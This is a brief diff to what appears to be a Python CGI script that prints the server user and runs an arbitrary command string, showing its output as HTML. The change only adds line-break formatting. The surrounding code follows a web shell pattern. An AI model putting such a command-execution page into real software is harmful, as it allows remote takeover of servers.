@@ -58,5 +58,7 @@ print "user:"+ commands.getoutput("whoami")+"<br>"
 print "executing: "+cmd
 output = commands.getoutput(cmd)
 
+output = output.replace("\n","<br>\n")
+
 print "<br><br>"
 print output
